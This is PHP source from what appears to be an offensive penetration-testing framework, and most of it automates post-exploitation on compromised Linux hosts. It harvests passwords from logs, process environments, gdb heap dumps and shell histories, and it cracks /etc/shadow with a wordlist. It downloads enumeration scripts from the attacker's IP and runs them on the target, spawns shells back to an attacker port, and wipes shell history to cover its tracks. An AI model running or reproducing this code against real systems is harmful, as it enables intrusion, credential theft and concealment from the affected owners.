<?php

class check4linux8enum extends lan4linux{


    /*
     https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md
         https://github.com/Ignitetechnologies/Privilege-Escalation/blob/master/README.md
         https://percussiveelbow.github.io/linux-privesc/
     https://book.hacktricks.xyz/linux-unix/privilege-escalation
     */

    
    public function __construct($eth,$domain,$ip,$port,$protocol,$stream,$templateB64_id,$templateB64_cmd,$templateB64_shell,$id8b64) {        
        parent::__construct($eth,$domain,$ip,$port,$protocol,$stream,$templateB64_id,$templateB64_cmd,$templateB64_shell,$id8b64);
    }
    
    
    
    public function lan2bins(){
        
        $this->titre(__FUNCTION__);
            
            $this->ssTitre("What OS is currently running?");
            $this->note("Debian");
            $data = "dpkg -l | grep '^ii' | awk '{print $2 \"=\" $3 \"=\" $5}'";
            $this->lan2stream4result($data,$this->stream_timeout);
            
            
            $this->note("RedHat");
            $data = "rpm -qa --last";
            $this->lan2stream4result($data,$this->stream_timeout);
            
            $data = "yum list | grep installed";
            $this->lan2stream4result($data,$this->stream_timeout);
            
            $this->note("Solaris");
            $data = "pkginfo";
            $this->lan2stream4result($data,$this->stream_timeout);
            
            $data = "pkg_info";
            $this->lan2stream4result($data,$this->stream_timeout);
            
            $this->note("Gentoo");
            $data = "cd /var/db/pkg/; ls -d ";
            $this->lan2stream4result($data,$this->stream_timeout);
            
            $this->note("Arch Linux");
            $data = "pacman -Q";
            $this->lan2stream4result($data,$this->stream_timeout);
            

            
           
    }
    
    
    
    
    public function lan2hw(){
        $this->titre(__FUNCTION__);
           
 
            
            $data = "df -h";
            $this->lan2stream4result($data,$this->stream_timeout);
            
            $this->note("Are there any unmounted file-systems?");
            $data = "grep -v -e '^$' /etc/fstab  | grep -v '^#' | sort -u 2>/dev/null";
            $this->lan2stream4result($data,$this->stream_timeout);
            
            $data = "cat /proc/cpuinfo";
            $this->lan2stream4result($data,$this->stream_timeout);
            
            $data = "/usr/bin/lspci";
            $this->lan2stream4result($data,$this->stream_timeout);
            
            $data = "/usr/bin/lsusb";
            $this->lan2stream4result($data,$this->stream_timeout);
            
            $this->note("Is there a printer?");
            $data = "lpstat -a";
            $this->lan2stream4result($data,$this->stream_timeout);
            
            $data = "lscpu";
            $this->lan2stream4result($data,$this->stream_timeout);
            
            $data = "lsmem";
            $this->lan2stream4result($data,$this->stream_timeout);
            
      
    }
    
    
    
    
    
    
    
    
    
    
    public function lan2lhost(){
        
        $this->titre(__FUNCTION__);
        $this->article("IP",$this->ip);
        
            
            $data = "ls -alh /var/lib/pgsql";
            $this->lan2stream4result($data,$this->stream_timeout);
            
            $data = "ls -alh /var/lib/mysql";
            $this->lan2stream4result($data,$this->stream_timeout);
            
            $data = "cat /var/lib/dhcp3/dhclient.leases  | grep -v '^#' | sort -u 2>/dev/null";
            $this->lan2stream4result($data,$this->stream_timeout);
            
            $data = "pdbedit -L -w";
            $this->lan2stream4result($data,$this->stream_timeout);
            
            $data = "pdbedit -L -v";
            $this->lan2stream4result($data,$this->stream_timeout);
            
            $data = "grep -v -e '^$' /etc/fstab | grep -v '^#' 2>/dev/null";
            $this->lan2stream4result($data,$this->stream_timeout);
            
            $data = "find /etc/sysconfig/ -type f -exec cat {} \;  | grep -v '^#' 2>/dev/null";
            $this->lan2stream4result($data,$this->stream_timeout);
            
            $data = "chkconfig --list";
            $this->lan2stream4result($data,$this->stream_timeout);
         
            $this->note("umask value as in /etc/login.defs");
            $data = "grep -i \"^UMASK\" /etc/login.defs 2>/dev/null";
            $this->lan2stream4result($data,$this->stream_timeout);
             
            $this->note("current umask value with both octal and symbolic output");
            $data = "umask -S 2>/dev/null & umask 2>/dev/null";
            $this->lan2stream4result($data,$this->stream_timeout);
            
            
            $this->note("check if selinux is enabled");
            $data = "sestatus 2>/dev/null";
            $this->lan2stream4result($data,$this->stream_timeout);
    }
    
    
    public function lan2infos(){
        
        // find ./ -type f -name '*.C' -o -name '*.cc' | xargs -I '{}' mv '{}' '{}'.BAK
        // find ./ -type f -regex ".*\.\(C\|cpp\)$" | xargs -I '{}' mv '{}' '{}'.BAK
        
        # http://www.thegeekstuff.com/2011/08/linux-var-log-files/")
        
        $this->titre(__FUNCTION__);

            
            $this->note("apache details - if installed");
            $data = "apache2 -v 2>/dev/null; httpd -v 2>/dev/null";
            $this->lan2stream4result($data,$this->stream_timeout);
            
            $this->note("what account is apache running under");
            $data = "grep -i 'user\|group' /etc/apache2/envvars 2>/dev/null |awk '{sub(/.*\export /,\"\")}1' 2>/dev/null";
            $this->lan2stream4result($data,$this->stream_timeout);
            
            $this->note("installed apache modules");
            $data = "apache2ctl -M 2>/dev/null; httpd -M 2>/dev/null";
            $this->lan2stream4result($data,$this->stream_timeout);
            
            
            $this->note("postgres details - if installed");
            $data = "psql -V 2>/dev/null";
            $this->lan2stream4result($data,$this->stream_timeout);
            
            $data = "psql -U postgres template0 -c 'select version()' 2>/dev/null | grep version";
            $this->lan2stream4result($data,$this->stream_timeout);
            
            $data = "psql -U postgres template1 -c 'select version()' 2>/dev/null | grep version";
            $this->lan2stream4result($data,$this->stream_timeout);
            
            $data = "psql -U pgsql template0 -c 'select version()' 2>/dev/null | grep version";
            $this->lan2stream4result($data,$this->stream_timeout);
            
            
            $this->note("mysql details - if installed");
            $data = "mysql --version 2>/dev/null";
            $this->lan2stream4result($data,$this->stream_timeout);
            
            $data = "mysqladmin -uroot -proot version 2>/dev/null";
            $this->lan2stream4result($data,$this->stream_timeout);
            
            
            
            
            
            

            
            
            $data = "/bin/pwd";
            $this->lan2stream4result($data,$this->stream_timeout);
            
            
            $this->note("Any plain text usernames and/or passwords?");
            $data = "grep -i -E \"(user=|passw)\" /var/log/*.log | cut -d \" \" -f7- | sort -u";
            $this->lan2stream4result($data,$this->stream_timeout);
            
            
            $data = "which php";
            $php = $this->lan2stream4result($data,$this->stream_timeout);
            
            if(!empty($php)){
                $result .= $php;
                $data = "php -r \"phpinfo();\" ";
                $this->lan2stream4result($data,$this->stream_timeout);
                
                

                
            }

            
            
            $this->note("Finding Important Files");
            $data = "grep -v -e '^$' /etc/apache2/sites-enabled/000-default 2>/dev/null";
            $this->lan2stream4result($data,$this->stream_timeout);
            
            
            $data = "ls -alhtr /media/";
            $this->lan2stream4result($data,$this->stream_timeout);
            
            
            $data = "ls -alhtr /tmp/";
            $this->lan2stream4result($data,$this->stream_timeout);
            
            
            $data = "ls -alhtr /home/";
            $this->lan2stream4result($data,$this->stream_timeout);
            
            
            $data = "ls -alhtr /root/";
            $this->lan2stream4result($data,$this->stream_timeout);
            
            
            $data = "ls /home/*/id*";
            $this->lan2stream4result($data,$this->stream_timeout);
            

            
            
            $data = "ls -alh /var/mail/";
            $this->lan2stream4result($data,$this->stream_timeout);
            
            
            
            
            $data = "grep -v -e '^$' /etc/rsyslog.conf  | grep -v \"^#\" | sort -u 2>/dev/null";
            $this->lan2stream4result($data,$this->stream_timeout);
            
            
            $data = "cat /var/apache2/config.inc  | grep -v \"^#\" | sort -u 2>/dev/null";
            $this->lan2stream4result($data,$this->stream_timeout);
            
            
            $data = "cat /var/lib/mysql/mysql/user.MYD  | strings | grep -v \"^#\" ";
            $this->lan2stream4result($data,$this->stream_timeout);
            
            
            $data = "cat /root/anaconda-ks.cfg  | grep -v \"^#\" | sort -u 2>/dev/null";
            $this->lan2stream4result($data,$this->stream_timeout);
            
            
            $data = "ls -alhR /var/www/";
            $this->lan2stream4result($data,$this->stream_timeout);
            

    }
    
    
    
    public function lan2tools4lynis(){
        
        $result = "";
        $result .= $this->ssTitre(__FUNCTION__);
        
        if (!file_exists("$this->dir_tmp/lynis-master.tar.xz")) $this->requette("cp -v $this->dir_tools/lan/linux/lynis-master.tar.xz $this->dir_tmp/lynis-master.tar.xz ");
        // $data = "wget https://github.com/CISOfy/lynis/archive/master.zip -O  /tmp/lynis.zip && unzip /tmp/lynis.zip -d /tmp/ && /tmp/lynis-master/lynis audit system  > /tmp/lynis-master/lynis.rst && cat /tmp/lynis-master/lynis.rst && rm -vr /tmp/lynis-master";
        
        $data = "wget http://".$this->ip4addr4target($this->ip).":$this->port_rfi/lynis-master.tar.xz -O  /tmp/lynis-master.tar.xz";
        $lines = trim($this->lan2stream4result($data,$this->stream_timeout));
        
        
        $data = "tar -xvf /tmp/lynis-master.tar.xz -C /tmp/ ";
        $lines = trim($this->lan2stream4result($data,$this->stream_timeout));
        
        $this->pause();
        
        $data = "cd /tmp/lynis-master/; bash lynis audit system --pentest --quick --no-log ";
        $lines = trim($this->lan2stream4result($data,$this->stream_timeout));
        
        $this->pause();
        
        $data = " rm -vr /tmp/lynis* ";
        //$lines = trim($this->lan2stream4result($data,$this->stream_timeout));
        
        // $this->pause();
        
        
        return $result;
    }
    
    public function lan2tools(){
        
        $result = "";
        $result .= $this->titre(__FUNCTION__);
        $sql_r_1 = "SELECT ".__FUNCTION__." FROM LAN WHERE $this->lan2where AND ".__FUNCTION__." IS NOT NULL";
        if ($this->checkBD($sql_r_1) ) return base64_decode($this->req2BD4out(__FUNCTION__,"LAN","id8port = '$this->port2id'"));
        else {
            $attacker_ip = $this->ip4addr4target($this->ip);
            $this->tcp2open4server($attacker_ip, $this->port_rfi);
            
            $result .= $this->lan2tools4lynis();$this->pause();
            
            $result .= $this->lan2tools4linEnum();$this->pause();
            // https://github.com/DominicBreuker/pspy
            
            
            $result = base64_encode($result);return base64_decode($this->req2BD4in(__FUNCTION__,"LAN","id8port = '$this->port2id'",$result));
        }
    }
    
    
    
    
    public function lan2tools4linEnum(){
        $result = "";
        $result .= $this->ssTitre(__FUNCTION__);
        if (!file_exists("$this->dir_tmp/LinEnum.sh")) $this->requette("wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O $this->dir_tmp/LinEnum.sh ");
        $data = "wget http://".$this->ip4addr4target($this->ip).":$this->port_rfi/LinEnum.sh -O ./LinEnum.sh";
        $this->lan2stream4result($data,$this->stream_timeout);
        
        $data = "bash ./LinEnum.sh -t";
        $this->lan2stream4result($data,$this->stream_timeout);
        
        $data = "rm -v ./LinEnum.sh ";
        $this->lan2stream4result($data,$this->stream_timeout);
        
        return $result;
    }
    
    
    
    
   
    
    
    
    
    public function lan2os(){
        $this->titre(__FUNCTION__);

        
  
            
            
            $data = "grep -v -e '^$' /etc/*master | grep -v '^#' | sort -u 2>/dev/null";
            $this->lan2stream4result($data,$this->stream_timeout);
            

            $data = "find /home -type f -iname '.*history' -exec cat {} \; 2>/dev/null" ;
            $this->lan2stream4result($data,$this->stream_timeout);
            
            
            
            
            $this->note("Shows the kernel version.
This can be used to help determine the OS running and the last time it's been fully updated.");
            $data = "cat /proc/version";
            $this->lan2stream4result($data,$this->stream_timeout);
            
            
            $data = "grep -v -e '^$' /etc/issue";
            $this->lan2stream4result($data,$this->stream_timeout);
            
            
            $data = "grep -v -e '^$' /etc/issue.net";
            $this->lan2stream4result($data,$this->stream_timeout);
            
            
            $data = "grep -v -e '^$' /etc/*-release /etc/*_version /etc/*-version";
            $this->lan2stream4result($data,$this->stream_timeout);
            
            
            $data = "/usr/bin/lsb_release -a";
            $this->lan2stream4result($data,$this->stream_timeout);
            
            
            $data = "grep -v -e '^$' /etc/release";
            $this->lan2stream4result($data,$this->stream_timeout);
            
            
            $data = "grep -v -e '^$' /etc/rc.conf";
            $this->lan2stream4result($data,$this->stream_timeout);
            
            
            $data = "arch";
            $this->lan2stream4result($data,$this->stream_timeout);
            
            
            $data = "uname -a";
            $this->lan2stream4result($data,$this->stream_timeout);
            
            $data = "ls /boot | grep vmlinuz-";
            $this->lan2stream4result($data,$this->stream_timeout);
            
            $data = "hostname ";
            $this->lan2stream4result($data,$this->stream_timeout);
            
            $data = "/usr/bin/hostnamectl";
            $this->lan2stream4result($data,$this->stream_timeout);
            
            $this->note("What's the Kernel version? Is it 64-bit?");
            $data = "rpm -q kernel";
            $this->lan2stream4result($data,$this->stream_timeout);

            

    }
    
    
    public function lan2ps(){
        $result = "";
        $result .= $this->ssTitre(__FUNCTION__);
        
        $this->note("Process binaries and associated permissions");
        $data = "ps aux 2>/dev/null | awk '{print $11}'|xargs -r ls -la 2>/dev/null |awk '!x[$0]++' 2>/dev/null";
        $this->lan2stream4result($data,$this->stream_timeout);
              
        $this->note("lookup process binary path and permissisons");
        $data = "ps aux 2>/dev/null | awk '{print $11}'|xargs -r ls -la 2>/dev/null |awk '!x[$0]++' 2>/dev/null";
        $this->lan2stream4result($data,$this->stream_timeout);
        
        
        $this->note("running processes");
        $data = "ps aux 2>/dev/null";
        $this->lan2stream4result($data,$this->stream_timeout);
        
        $this->ssTitre("What applications are installed? What version are they? Are they currently running?");
        
        $this->note("Which service(s) are been running by root? Of these services, which are vulnerable - it's worth a double check!");
        $data = "ps aux | grep root";
        $this->lan2stream4result($data,$this->stream_timeout);
        
        $data = "ps -ef | grep root";
        $this->lan2stream4result($data,$this->stream_timeout);
        
        $data = "ps -eo args --user 0 --no-headers ";
        $this->lan2stream4result($data,$this->stream_timeout);
        
        
        
        $data = "lsof | grep -i 'root' ";
        $this->lan2stream4result($data,$this->stream_timeout);
        
        $data = "lsof -nPi";
        $this->lan2stream4result($data,$this->stream_timeout);
        
        $data = "ps aux";
        $this->lan2stream4result($data,$this->stream_timeout);
        
        $data = "ps -ejf";
        $this->lan2stream4result($data,$this->stream_timeout);
        
        $data = "pstree";
        $this->lan2stream4result($data,$this->stream_timeout);
        
        $data = "ps  xao pid,ppid,pgid,sid,comm";
        $this->lan2stream4result($data,$this->stream_timeout);
        
        $data = "ps -o pid,command --user 0 --no-headers | sort -u | grep -v \"^\[\"  | grep  \"\.\" ";
        $process_lists = $this->lan2stream4result($data,$this->stream_timeout);
        $lines = explode("\n", $process_lists);
        foreach ($lines as $line){
            if(!empty($line)){
                $this->lan2ps2extract4file($line);
            }
            
        }
        
        return $result ;
    }
    
    
    public function lan2ps2extract4file($line){
        $result = "";
        $result .= $this->ssTitre(__FUNCTION__);
        $results = array();
        if (preg_match('/(?<pid>[0-9]{1,5})([[:space:]]{1,})(?<compiler>[[:print:]]{1,})([[:space:]]{1,})(?<file>[[:print:]]{1,})\.sh/',$line,$results))  {$result .= $this->result4extract4file("sh",$results);}
        if (preg_match('/(?<pid>[0-9]{1,5})([[:space:]]{1,})(?<compiler>[[:print:]]{1,})([[:space:]]{1,})(?<file>[[:print:]]{1,}.py)/',$line,$results))  {$result .= $this->result4extract4file("py",$results);}
        if (preg_match('/(?<pid>[0-9]{1,5})([[:space:]]{1,})(?<compiler>[[:print:]]{1,})([[:space:]]{1,})(?<file>[[:print:]]{1,})\.rb/',$line,$results))  {$result .= $this->result4extract4file("rb",$results);}
        if (preg_match('/(?<pid>[0-9]{1,5})([[:space:]]{1,})(?<compiler>[[:print:]]{1,})([[:space:]]{1,})(?<file>[[:print:]]{1,})\.pl/',$line,$results))  {$result .= $this->result4extract4file("pl",$results);}
        if (preg_match('/(?<pid>[0-9]{1,5})([[:space:]]{1,})(?<compiler>[[:print:]]{1,})([[:space:]]{1,})(?<file>[[:print:]]{1,})\.php/',$line,$results))  {$result .= $this->result4extract4file("php",$results);}
        if (preg_match('/(?<pid>[0-9]{1,5})([[:space:]]{1,})(?<compiler>[[:print:]]{1,})([[:space:]]{1,})(?<file>[[:print:]]{1,})\.jar/',$line,$results))  {$result .= $this->result4extract4file("jar",$results);}
        if (preg_match('/(?<pid>[0-9]{1,5})([[:space:]]{1,})(?<compiler>[[:print:]]{1,})([[:space:]]{1,})(?<file>[[:print:]]{1,})\.jsp/',$line,$results))  {$result .= $this->result4extract4file("jsp",$results);}
        //if (preg_match('/(?<pid>[0-9]{1,5})([[:space:]]{1,})(?<compiler>[[:print:]]{1,})([[:space:]]{1,})(?<file>[[:print:]]{1,})\.xml/',$line,$results))  {$result .= $this->result4extract4file("xml",$results);}
        return $result;
    }
    
    
    
    
    public function lan2ps2result4extract4file($compiler,$results){
        $result = "";
        $result .= $this->ssTitre(__FUNCTION__);
        $result .= $this->article("PID", $results['pid']);
        $result .= $this->article("Compiler", $results['compiler']);
        $result .= $this->article("File Exec", $results['file']);
        
        $this->pause();
        $filename_path = $this->lan2file4locate($results['file'].".$compiler");
        $result .= $this->article("File PATH", $filename_path);
        if(!empty($filename_path)){
            
            $data = "ls -al $filename_path";
            $permission = $this->lan2stream4result($data,$this->stream_timeout);
            $result .= $permission ;
            
            $data = "cat $filename_path";
            $contenu = $this->lan2stream4result($data,$this->stream_timeout);
            
            
            $data = "ls  $filename_path.bak";
            $file_exist = trim($this->lan2stream4result($data,$this->stream_timeout));
            
            if(!empty($file_exist)){
                $this->note("Sauvegarde Exist");
            }
            else {
                $data = "cp -v $filename_path $filename_path.bak";
                $clone = $this->lan2stream4result($data,$this->stream_timeout);
            }
        }
        
        
        
        $this->pause();
        return "";
        
        
        $result .= $this->lan4pid($results['pid']);
        switch (strtolower($compiler)){
            case "bash" :
            case "sh" :
            case "/bin/sh" :
            case "/bin/sh" :
            case "/bin/dash" :
            case "dash" :
                
                break ;
            case "python" :
            case "py" :
                
                break ;
            case "perl" :
            case "pl" :
                
                break ;
            case "php" :
                
                break ;
            case "ruby" :
            case "rb" :
                
                break ;
                
            case "jar" :
                
                break ;
            case "war" :
                
                break ;
            case "jsp" :
                
                break ;
            case "xml" :
                
                break ;
                
            case "conf" :
            case "cfg" :
                
                break ;
                
            case "elf" :
            case "bin" :
                
                break ;
                
                
        }
        return $result;
    }
    
    public function lan2pid(){
        $result = "";
        $this->titre(__FUNCTION__);
        // https://github.com/DominicBreuker/pspy
        $data = "ps -eo pid,user  --no-headers | awk '{print $1}' | sort -u";
        $tab_pid_str = $this->lan2stream4result($data,$this->stream_timeout);
        $tab_pid = explode("\n", $tab_pid_str);
        foreach ($tab_pid as $pid){
            if (!empty($pid)) {
                $this->article("PID", $pid);
                $result .= $this->lan4pid($pid);
            }
        }
        return $result ;
    }
    
    
    public function lan2shell4tracks2histfile(){
        $this->ssTitre(__FUNCTION__);
        $histfile = "";
        $data = "echo \$HISTFILE";
        $histfile = trim($this->lan2stream4result($data,$this->stream_timeout));
        if(!empty($histfile)){
            return $histfile ;
        }
        $data = "cat ~/.bash_history";
        $histfile = trim($this->lan2stream4result($data,$this->stream_timeout));
        if(!empty($histfile)){
            return $histfile ;
        }
        $data = "find /home -iname \".bash_history\" -type f -exec ls {} \; 2>/dev/null";
        $histfile = trim($this->lan2stream4result($data,$this->stream_timeout));
        if(!empty($histfile)){
            return $histfile ;
        }
        return $histfile ;
    }
    
    
    public function lan2shell4tracks(){
        $result = "";
        $result .= $this->ssTitre(__FUNCTION__);
        // https://www.computernetworkingnotes.com/linux-tutorials/customize-or-change-shell-command-prompt-in-linux.html
        // PS1="\! "
        // PS1="\t "
        // history -c
        $histfile = $this->lan2users4tracks2histfile();
        if(!empty($histfile)){
            $result .= $histfile;
            $data = "cat $histfile";
            $history_str = trim($this->lan2stream4result($data,$this->stream_timeout));
            $result .= $history_str;
            $data = "export HISTFILE=";
            $this->article($data, "This next one might not be a good idea, because a lot of folks know to check for tampering with this file, and will be suspicious if they find out:");
            $this->lan2stream4result($data,$this->stream_timeout);
            
        }
        
        $result .= $histfile;
        /*
         Covering Your Tracks
         \u25cf export HISTFILE=
         This next one might not be a good idea, because a lot of folks know to check for tampering with this file, and will be suspicious if they find out:
         \u25cf rm -rf ~/.bash_history && ln -s ~/.bash_history /dev/null (invasive)
         \u25cf touch ~/.bash_history (invasive)
         \u25cf <space> history -c (using a space before a command)
         \u25cf zsh% unset HISTFILE HISTSIZE
         \u25cf t?csh% set history=0
         \u25cf bash$ set +o history
         \u25cf ksh$ unset HISTFILE
         
         
         faire des tests avec history
         */
        
        
        
        
        return $result;
        
        
        $this->note("");
        $data = "";
        $this->lan2stream4result($data,$this->stream_timeout);
        
        
        
    }
    
    
    public function lan4pid($pid) {
        /*
         /proc/[PID]/cmdline    Lists everything that was used to invoke the process. This sometimes contains useful paths to configuration files as well as usernames and passwords.
         /proc/[PID]/environ    Lists all the environment variables that were set when the process was invoked.  This also sometimes contains useful paths to configuration files as well as usernames and passwords.
         /proc/[PID]/cwd        Points to the current working directory of the process.  This may be useful if you don't know the absolute path to a configuration file.
         /proc/[PID]/fd/[#]     Provides access to the file descriptors being used.  In some cases this can be used to read files that are opened by a process.
         
         */
        $result = "";
        $result .= $this->titre(__FUNCTION__);
        $pid = trim($pid);
        $result = "";
        $pid = (int)$pid;
        if(is_int($pid)){
            
            
            
            $data = "cat /proc/$pid/comm";
            $this->lan2stream4result($data,$this->stream_timeout);
            
            $data = "sh -c 'ps -p $pid -o ppid=' | xargs ps -o cmd= -p";
            $this->lan2stream4result($data,$this->stream_timeout);
            
            
            $data = "sh -c 'ps -p $pid -o ppid=' | xargs -I'{}' readlink -f '/proc/{}/exe'";
            $this->lan2stream4result($data,$this->stream_timeout);
            
            $data = "lsof -a +D /bin +D /usr/bin -p $pid -d txt";
            $this->lan2stream4result($data,$this->stream_timeout);
            
            $data =  "cat /proc/$pid/cmdline ";
            $this->lan2stream4result($data,$this->stream_timeout);
            
            $data =  "cat /proc/$pid/cwd ";
            $this->lan2stream4result($data,$this->stream_timeout);
            
            $data =  "cat /proc/$pid/status ";
            $this->lan2stream4result($data,$this->stream_timeout);
            
            $data =  "cat /proc/$pid/environ ";
            $this->lan2stream4result($data,$this->stream_timeout);
            
            $data =  "cat /proc/$pid/mem | strings ";
            $this->lan2stream4result($data,$this->stream_timeout);
            
            $data =  "cat /proc/$pid/fd ";
            $this->lan2stream4result($data,$this->stream_timeout);
            
            $data = "readlink /proc/$pid/exe";
            $this->lan2stream4result($data,$this->stream_timeout);
            
            $data = "ls -l /proc/$pid/exe | sed 's%.*/%%'";
            $this->lan2stream4result($data,$this->stream_timeout);
            
            
            $data = "ps -f --pid $pid";
            $this->lan2stream4result($data,$this->stream_timeout);
            
            $data = "pidstat -p $pid";
            $this->lan2stream4result($data,$this->stream_timeout);
            
            $data = "ps -f --forest --pid $pid";
            $this->lan2stream4result($data,$this->stream_timeout);
            
            $data = "pstree -p $pid";
            $this->lan2stream4result($data,$this->stream_timeout);
            
            $data = "pcat -v $pid";
            $this->lan2stream4result($data,$this->stream_timeout);
            
            $data =  "pmap -d $pid";
            $this->lan2stream4result($data,$this->stream_timeout);
            
            $data =  "lsof -p $pid";
            $this->lan2stream4result($data,$this->stream_timeout);
            
            
            $data =  "ls /proc/$pid ";
            $this->lan2stream4result($data,$this->stream_timeout);
            
            
            $result .= $this->lan4pid8gdb($pid);
            
            $this->ssTitre("libraries trace");
            $data =  "ltrace -p $pid";
            //$this->lan2stream4result($data,$this->stream_timeout);
            $this->ssTitre("syscall trace");
            $data =  "strace -p $pid";
            //$this->lan2stream4result($data,$this->stream_timeout);
            $this->ssTitre("heap - malloc trace");
            $data =  "mtrace $pid";
            //$this->lan2stream4result($data,$this->stream_timeout);
            
            $data =  "dtrace -p $pid";
            $this->lan2stream4result($data,$this->stream_timeout);
            
            
            
            
            
            
        }
        return $result;
    }
    
    
    public function lan4pid8gdb($pid){
        $result = "";
        $result .= $this->titre(__FUNCTION__);
        $pid = trim($pid);
        if($this->lan2search4app4exist("gdb")) {
            $data =  "gdb --batch -q -p $pid -ex \"info proc stat\" 2>&1";
            $this->lan2stream4result($data,$this->stream_timeout);
            
            $data =  "gdb --batch -q -p $pid -ex \"info proc status\" 2>&1";
            $this->lan2stream4result($data,$this->stream_timeout);
            
            $data =  "gdb --batch -q -p $pid -ex \"info variables\" 2>&1";
            $this->lan2stream4result($data,$this->stream_timeout);
            
            $data =  "gdb --batch -q -p $pid -ex \"info args\" 2>&1";
            $this->lan2stream4result($data,$this->stream_timeout);
            
            $data =  "gdb --batch -q -p $pid -ex \"info proc mappings\" 2>&1";
            $this->lan2stream4result($data,$this->stream_timeout);
            
            $data =  "gdb --batch -q -p $pid -ex \"maintenance info sections\" 2>&1";
            $this->lan2stream4result($data,$this->stream_timeout);
            
            $data =  "gdb --batch -q -p $pid -ex \"info sharedlibrary\" 2>&1";
            $this->lan2stream4result($data,$this->stream_timeout);
            
            $data =  "gdb --batch -q -p $pid -ex \"info files\" 2>&1";
            $this->lan2stream4result($data,$this->stream_timeout);
            
            $data =  "gdb --batch -q -p $pid -ex \"info functions\" 2>&1";
            $this->lan2stream4result($data,$this->stream_timeout);
            
            $data =  "gdb --batch -q -p $pid -ex \"show args\" 2>&1";
            $this->lan2stream4result($data,$this->stream_timeout);
            
            $data =  "gdb --batch -q -p $pid -ex \"info threads\" 2>&1";
            $this->lan2stream4result($data,$this->stream_timeout);
            
            $data =  "gdb --batch -q -p $pid -ex \"show env\" 2>&1";
            $this->lan2stream4result($data,$this->stream_timeout);
            
            $data = "gdb -q --batch -p $pid -ex \"info proc mappings\" 2>&1 | grep -m1 \"\[heap\]\" | awk '{print $3}' ";
            $taille = trim($this->lan2stream4result($data,$this->stream_timeout));
            $data = "gdb -q --batch -p $pid -ex \"info proc mappings\" 2>&1 | grep -m1 \"\[heap\]\" | awk '{print $1}' ";
            $start_heap = trim($this->lan2stream4result($data,$this->stream_timeout));
            $data = "gdb -q --batch -p $pid -ex \"info proc mappings\" 2>&1 | grep -m1 \"\[heap\]\" | awk '{print $2}' ";
            $end_heap = trim($this->lan2stream4result($data,$this->stream_timeout));
            $search = "passw";
            $data =  "gdb --batch -q -p $pid -ex \"find $start_heap,$end_heap,\\\"$search\\\"\" 2>&1";
            $this->lan2stream4result($data,$this->stream_timeout);
            
            $data =  "gdb --batch -q -p $pid -ex \"x/".hexdec($taille)."s $start_heap\" 2>&1 | awk -F: '{print $2}' | strings | sort -u";
            $this->lan2stream4result($data,$this->stream_timeout);
            
            
        }
        
        
        return $result;
        
        
        $data =  "gdb --batch -q -p $pid -ex 'set disassembly-flavor intel' -ex \"disas $fonction_plt\" 2>&1";
        $this->lan2stream4result($data,$this->stream_timeout);
        
        
    }
    
    
    
    
    
    public function lan2root8bin($bin_path,$sudo,$userpass){
        $this->ssTitre(__FUNCTION__);
        $filepath = trim($bin_path);
        
        $data = "ls -al $filepath";
        $this->lan2stream4result($data, $this->stream_timeout);
        
            $obj_suid = new bin4linux($filepath);
            $argv = "";
           
            if (in_array($obj_suid->file_name, $this->tab_sudo8app2shell) ) {
                $cmd_id = "%ID%";
                $attacker_ip = $this->ip4addr4target($this->ip);
                $attacker_port = rand(1024,65535);
                //$attacker_port = 7777;
                $shell = "/bin/bash";
                $id = $obj_suid->elf4root2cmd($this->ip,$attacker_port,$shell,$sudo,$userpass, $cmd_id);
                $this->pause();
                $template_id_test = str_replace("%ID%", $id, $this->template_id);
                
                $this->lan2pentest8id($template_id_test,$attacker_ip,$attacker_port,$shell);$this->pause();
            }
   }
 
    public function lan2root8shadow($shadow_str,$password_str){
        $this->ssTitre(__FUNCTION__);
        
        file_put_contents("/tmp/$this->ip.$this->port.$this->protocol.shadow", $shadow_str);
        file_put_contents("/tmp/$this->ip.$this->port.$this->protocol.passwd", $password_str);
        
        $unshadow_file = "/tmp/$this->ip.$this->port.$this->protocol.unshadow";
        $this->requette("unshadow '/tmp/$this->ip.$this->port.$this->protocol.passwd'  '/tmp/$this->ip.$this->port.$this->protocol.shadow'  > $unshadow_file");
        $dico = "$this->dir_tools/dico/password.dico.10k"  ;
        if (!$this->ip2root8db($this->ip2id)){
        if ($this->ip2crack($unshadow_file,$dico)==="1") {
            $this->note("Cracking unshadow already done");
            
        }
        }
        
    }

    
   
    
    
    
    public function lan2root8cve($tab_cve){
        $result = "";
        $result .= $this->ssTitre(__FUNCTION__);
        foreach ($tab_cve as $cve){
            $cve = trim($cve);
            switch ($cve) {
                case "" :
                    break;
                    
            }
        }
    }
    
}
?>
